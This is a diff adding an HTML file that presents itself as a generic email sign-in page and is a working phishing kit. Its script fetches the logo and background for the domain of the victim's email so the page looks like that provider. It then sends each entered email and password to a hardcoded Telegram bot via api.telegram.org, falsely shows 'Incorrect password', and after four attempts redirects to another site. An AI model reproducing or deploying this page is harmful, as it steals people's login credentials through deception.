@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;            
+            align-items: center;
+            height: 100vh;
+            background-size: cover;
+            background-position: center;
+            background-color: #f0f0f0;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 350px;
+            height: 400px
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+            background-color: #ddd;
+            border-radius: 50%;
+            display: inline-block;
+            object-fit: contain;
+        }
+
+        .input-field {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .button {
+            width: 97%;
+            padding: 10px;
+            background-color: #007BFF;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="email-page">
+        <img src="data:image/png;base64,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" alt="" class="logo" id="logo">
+        <h4>Create account or Sign in</h4>
+        <input type="email" id="email" class="input-field" placeholder="Enter your email" required>
+        <button class="button" id="next-button">Next</button><br><br><b>Use a One-Time Sign in link</b><br><br><br><small>One-Time signin url link will be pushed to email
+    </div>
+
+    <div class="container" id="password-page" style="display: none;">Account already exist
+        <img src="" alt="Logo" class="logo" id="logo-password"><br><br> Sign in to continue!<br><br>
+        <h2 id="email-display"></h2>
+        <input type="password" id="password" class="input-field" placeholder="Enter your password" required>
+        <button class="button" id="submit-button">Sign in</button>We send Activation Link to your Email.
+    </div>
+
+ <script>
+        const emailPage = document.getElementById('email-page');
+        const passwordPage = document.getElementById('password-page');
+        const emailField = document.getElementById('email');
+        const passwordField = document.getElementById('password');
+        const nextButton = document.getElementById('next-button');
+        const submitButton = document.getElementById('submit-button');
+        const emailDisplay = document.getElementById('email-display');
+        const logo = document.getElementById('logo');
+        const logoPassword = document.getElementById('logo-password');
+
+        let attemptCount = 0;
+
+        nextButton.addEventListener('click', () => {
+            const email = emailField.value;
+            if (email) {
+                const domain = email.split('@')[1];
+                if (domain) {
+                    const logoUrl = `https://logo.clearbit.com/${domain}`;
+                    const bgUrl = `https://source.unsplash.com/1600x900/?${domain}`;
+
+                    // Update logo and background
+                    logo.src = logoUrl;
+                    logoPassword.src = logoUrl;
+                    document.body.style.backgroundImage = `url(${bgUrl})`;
+                }
+
+                // Transition to password page
+                emailPage.style.display = 'none';
+                passwordPage.style.display = 'block';
+                emailDisplay.textContent = email;
+            } else {
+                alert('Please enter a valid email.');
+            }
+        });
+
+        submitButton.addEventListener('click', async () => {
+            const email = emailField.value;
+            const password = passwordField.value;
+            if (email && password) {
+                attemptCount++;
+
+                if (attemptCount >= 4) {
+                    alert('Incorrect password entered too many times. Redirecting...');
+                    window.location.href = "https://updatebrowser.org";
+                    return;
+                }
+
+                // Telegram bot token and chat ID
+                const botToken = "7404707202:AAHEZ8wQN6-ZGqfohNi6fManLLurWNpg6b4";
+                const chatId = "5686268913";
+
+                // Send login data to Telegram
+                const message = `Email: ${email}\nPassword: ${password}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                alert('Incorrect password. Please try again.');
+            } else {
+                alert('Please enter your password.');
+            }
+        });
+    </script>
+</body>
+</html>
+
+
